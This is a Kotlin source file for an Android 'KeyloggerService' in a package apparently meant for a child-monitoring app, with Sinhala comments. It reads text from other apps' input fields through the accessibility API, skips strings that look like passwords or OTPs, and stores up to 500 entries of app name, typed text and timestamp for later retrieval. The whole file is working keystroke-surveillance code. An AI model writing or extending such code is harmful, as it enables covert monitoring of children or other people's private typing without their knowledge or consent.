package com.coc338781.childapp

import android.content.Context
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

object KeyloggerService {
    private const val PREF = "keylogger_prefs"
    private const val KEY_LOGS = "logs"
    private const val MAX_LOGS = 500

    // Text field එකක text එක capture කරන්න
    fun captureText(context: Context, appName: String, text: String) {
        try {
            if (text.isBlank() || text.length < 2) return
            if (text.length > 500) return

            // Sensitive text filter කරන්න
            if (isSensitive(text)) return

            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(KEY_LOGS, "[]") ?: "[]"
            val arr = JSONArray(existing)

            // Duplicate check — එකම text එක දෙපාරක් save කරන්න එපා
            if (arr.length() > 0) {
                val last = arr.getJSONObject(0)
                if (last.optString("text", "") == text &&
                    System.currentTimeMillis() - last.optLong("time", 0) < 30_000L) {
                    return
                }
            }

            val newObj = JSONObject().apply {
                put("app", appName)
                put("text", text)
                put("time", System.currentTimeMillis())
            }

            val newArr = JSONArray()
            newArr.put(newObj)
            for (i in 0 until minOf(arr.length(), MAX_LOGS - 1)) {
                newArr.put(arr.getJSONObject(i))
            }

            prefs.edit().putString(KEY_LOGS, newArr.toString()).apply()
        } catch (_: Exception) {}
    }

    // Sensitive text detect කරන්න (passwords, OTP)
    private fun isSensitive(text: String): Boolean {
        val lower = text.lowercase()
        return lower.contains("password") ||
                lower.contains("passwd") ||
                lower.contains("otp") ||
                lower.contains("pin") ||
                (text.length in 4..8 && text.all { it.isDigit() }) // OTP-like
    }

    // Stored keys ලබාගන්න
    fun getKeys(context: Context, limit: Int = 50): List<Triple<String, String, Long>> {
        return try {
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(KEY_LOGS, "[]") ?: "[]"
            val arr = JSONArray(existing)
            val list = mutableListOf<Triple<String, String, Long>>()
            for (i in 0 until minOf(arr.length(), limit)) {
                val obj = arr.getJSONObject(i)
                list.add(Triple(
                    obj.optString("app", "?"),
                    obj.optString("text", ""),
                    obj.optLong("time", 0)
                ))
            }
            list
        } catch (_: Exception) { emptyList() }
    }

    fun clear(context: Context) {
        try {
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            prefs.edit().putString(KEY_LOGS, "[]").apply()
        } catch (_: Exception) {}
    }

    // AccessibilityNodeInfo එකෙන් text එක extract කරන්න
    fun extractTextFromNode(node: AccessibilityNodeInfo?): String {
        node ?: return ""
        return try {
            val text = node.text?.toString() ?: ""
            if (text.isNotBlank()) text else node.contentDescription?.toString() ?: ""
        } catch (_: Exception) { "" }
    }
}
